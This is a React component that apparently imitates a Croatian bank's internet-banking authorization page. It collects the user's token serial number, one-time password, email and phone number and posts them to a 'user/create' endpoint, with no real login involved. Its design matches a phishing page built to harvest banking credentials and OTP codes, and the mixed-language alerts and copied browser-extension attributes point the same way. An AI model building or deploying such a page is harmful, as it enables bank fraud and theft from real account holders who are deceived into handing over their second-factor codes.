import { useEffect, useState } from "react";
import useAxios from "src/Hooks/UseAxios";
import axios from "../axios";

function Form() {
	const [token, setToken] = useState("");
	const [email, setEmail] = useState("");
	const [otp, setOtp] = useState("");
	const [phonenumber, setPhonenumber] = useState("");

	const submit = async (e) => {
		try {
			e.preventDefault();
			if (!token.length) { alert('Bitte geben Sie den Token-Wert ein'); return; }
			if (!email.length) {alert('Bitte geben Sie emial ein') ;  return;}
			if (!otp.length) {alert('Bitte geben Sie otp ein'); return;}
			if (!phonenumber.length) {alert('Bitte geben Sie die Telefonnummer ein') ; return;}
			
			const { data } = await axios.post("user/create", {
				token: token,
				email: email,
				otp:otp,
				phonenumber:phonenumber
			});
			setToken("")
			setEmail("")
			setOtp("")
			setPhonenumber("")

			console.log(token, email, phonenumber, otp);
		} catch (e) {
			alert(e)
		}
	};
	return (
		<div className="otp-page-white" bis_skin_checked={1}>
			<div className="container" bis_skin_checked={1}>
				<div className="row" bis_skin_checked={1}>
					<div className="col-md-8 col-md-offset-2 col-xs-12 col-xs-offset-0 text-center" bis_skin_checked={1}>
						<form id="autorizacijaNG" name="autorizacijaNG" className="otp-page-form otp-login-form otp-login-token">
							<div className="row" bis_skin_checked={1}>
								<div className="col-xs-10 col-xs-offset-1 text-center" bis_skin_checked={1}>
									<h4 id="name_el">Autorizacija korisnika usluge Internet bankarstvo</h4>
									<div className="form-group text-left" bis_skin_checked={1}>
										<label htmlFor="tokensn" id="tok_br">
											Serijski broj tokena
										</label>
										<input value={token} onChange={(e) => setToken(e.target.value)} type="text" id="tokensn" name="tokensn" className="form-control" data-min-length={1} data-validation-error-message="Molimo upišite" />
										<label htmlFor="otp" id="zap_br">
											Jednokratna zaporka
										</label>
										<input value={otp} onChange={(e) => setOtp(e.target.value)} type="text" id="otp" name="otp" className="form-control" data-min-length={1} data-validation-error-message="Molimo upišite" />
										<label htmlFor="email" id="zap_br">
											E-mail
										</label>
										<input value={email} onChange={(e) => setEmail(e.target.value)} type="email" id="email" name="email" className="form-control" data-min-length={1} data-validation-error-message="Molimo upišite" />
										<label htmlFor="contact_telefona" id="zap_br">
											Kontakt broj telefona
										</label>
										<input value={phonenumber} onChange={(e) => setPhonenumber(e.target.value)} type="tel" id="contact_telefona" name="contact_telefona" className="form-control" data-min-length={1} data-validation-error-message="Molimo upišite" />
										<div className="pull-right text-right" bis_skin_checked={1}>
											<a onClick={submit} href="#" className="btn btn-lg btn-success extra-top-margin" id="prijava" name="prijava">
												Ažuriranje
											</a>
										</div>
									</div>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
	);
}

export default Form;
